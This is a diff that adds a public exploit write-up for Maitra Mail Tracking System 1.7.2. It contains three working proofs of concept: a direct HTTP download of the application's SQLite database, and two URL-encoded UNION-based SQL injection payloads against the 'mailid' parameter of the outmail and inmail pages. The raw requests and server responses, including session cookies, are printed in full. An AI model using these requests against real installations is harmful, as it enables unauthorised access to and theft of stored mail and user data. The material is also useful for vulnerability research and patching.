@@ -1,0 +1,70 @@
+# Exploit Title: Maitra - Mail Tracking System 1.7.2 - SQL Injection / Database File Download
+# Dork: N/A
+# Date: 2018-11-11
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://salzertechnologies.com/
+# Software Link: https://netcologne.dl.sourceforge.net/project/maitra/maitra/maitra-desktop-v1.7.2.zip
+# Version: 1.7.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# Server : Mongoose web server v.5.6 [FREE EDITION]
+# Default listening_port: 8080,8081,8082
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/application/db/maitra.sqlite
+# 
+GET /[PATH]/application/db/maitra.sqlite HTTP/1.1
+Host: TARGET:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 11 Nov 2018 11:04:24 GMT
+Last-Modified: Sun, 11 Nov 2018 10:46:47 GMT
+Etag: "5be80897.1114112"
+Content-Type: text/plain
+Content-Length: 1114112
+Connection: keep-alive
+Accept-Ranges: bytes
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/?c=outmail&m=outmailentry&mailid=[SQL]
+# 
+GET /[PATH]/?c=outmail&m=outmailentry&mailid=-1)%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%32%2csqlite_version()%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2d%2d HTTP/1.1
+Host: TARGET:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: ci_session=a%3A6%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221537f5ec92a5c39fef327d355b49a9d4%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A12%3A%22192.168.1.27%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A68%3A%22Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A45.0%29+Gecko%2F20100101+Firefox%2F45.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1541933047%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A11%3A%22check_login%22%3Ba%3A5%3A%7Bs%3A10%3A%22login_name%22%3Bs%3A4%3A%22mail%22%3Bs%3A8%3A%22login_id%22%3Bs%3A2%3A%2224%22%3Bs%3A8%3A%22login_ad%22%3Bb%3A0%3Bs%3A10%3A%22login_type%22%3Bs%3A1%3A%222%22%3Bs%3A9%3A%22logged_in%22%3Bb%3A1%3B%7D%7D4dc0c3b97103da70527fd4cb032a2a78165b670b
+Connection: keep-alive
+HTTP/1.1 200 OK
+X-Powered-By: PHP/5.5.10
+Set-Cookie: ci_session=a%3A6%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221537f5ec92a5c39fef327d355b49a9d4%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A12%3A%22192.168.1.27%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A68%3A%22Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A45.0%29+Gecko%2F20100101+Firefox%2F45.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1541933047%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A11%3A%22check_login%22%3Ba%3A5%3A%7Bs%3A10%3A%22login_name%22%3Bs%3A4%3A%22mail%22%3Bs%3A8%3A%22login_id%22%3Bs%3A2%3A%2224%22%3Bs%3A8%3A%22login_ad%22%3Bb%3A0%3Bs%3A10%3A%22login_type%22%3Bs%3A1%3A%222%22%3Bs%3A9%3A%22logged_in%22%3Bb%3A1%3B%7D%7D4dc0c3b97103da70527fd4cb032a2a78165b670b; expires=Sun, 11-Nov-2018 12:48:15 GMT; Max-Age=7200; path=/
+Content-Type: text/html
+Transfer-Encoding: chunked
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/?c=inmail&m=inmailentry&mailid=[SQL]
+# 
+GET /[PATH]/?c=inmail&m=inmailentry&mailid=%2d%31%29%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%32%2c%73%71%6c%69%74%65%5f%76%65%72%73%69%6f%6e%28%29%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2d%2d HTTP/1.1
+Host: TARGET:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: ci_session=a%3A6%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%229bc792cd7f3df106dfaa30c4f9838dfb%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A12%3A%22192.168.1.27%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A68%3A%22Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A45.0%29+Gecko%2F20100101+Firefox%2F45.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1541931921%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A11%3A%22check_login%22%3Ba%3A5%3A%7Bs%3A10%3A%22login_name%22%3Bs%3A4%3A%22mail%22%3Bs%3A8%3A%22login_id%22%3Bs%3A2%3A%2224%22%3Bs%3A8%3A%22login_ad%22%3Bb%3A0%3Bs%3A10%3A%22login_type%22%3Bs%3A1%3A%222%22%3Bs%3A9%3A%22logged_in%22%3Bb%3A1%3B%7D%7D23567922d51348e5db91632764ff616f7d5670ad
+Connection: keep-alive
+HTTP/1.1 200 OK
+X-Powered-By: PHP/5.5.10
+Set-Cookie: ci_session=a%3A6%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221537f5ec92a5c39fef327d355b49a9d4%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A12%3A%22192.168.1.27%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A68%3A%22Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A45.0%29+Gecko%2F20100101+Firefox%2F45.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1541933047%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A11%3A%22check_login%22%3Ba%3A5%3A%7Bs%3A10%3A%22login_name%22%3Bs%3A4%3A%22mail%22%3Bs%3A8%3A%22login_id%22%3Bs%3A2%3A%2224%22%3Bs%3A8%3A%22login_ad%22%3Bb%3A0%3Bs%3A10%3A%22login_type%22%3Bs%3A1%3A%222%22%3Bs%3A9%3A%22logged_in%22%3Bb%3A1%3B%7D%7D4dc0c3b97103da70527fd4cb032a2a78165b670b; expires=Sun, 11-Nov-2018 12:44:07 GMT; Max-Age=7200; path=/
+Set-Cookie: ci_session=a%3A6%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221537f5ec92a5c39fef327d355b49a9d4%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A12%3A%22192.168.1.27%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A68%3A%22Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A45.0%29+Gecko%2F20100101+Firefox%2F45.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1541933047%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A11%3A%22check_login%22%3Ba%3A5%3A%7Bs%3A10%3A%22login_name%22%3Bs%3A4%3A%22mail%22%3Bs%3A8%3A%22login_id%22%3Bs%3A2%3A%2224%22%3Bs%3A8%3A%22login_ad%22%3Bb%3A0%3Bs%3A10%3A%22login_type%22%3Bs%3A1%3A%222%22%3Bs%3A9%3A%22logged_in%22%3Bb%3A1%3B%7D%7D4dc0c3b97103da70527fd4cb032a2a78165b670b; expires=Sun, 11-Nov-2018 12:44:07 GMT; Max-Age=7200; path=/
+Content-Type: text/html
+Transfer-Encoding: chunked
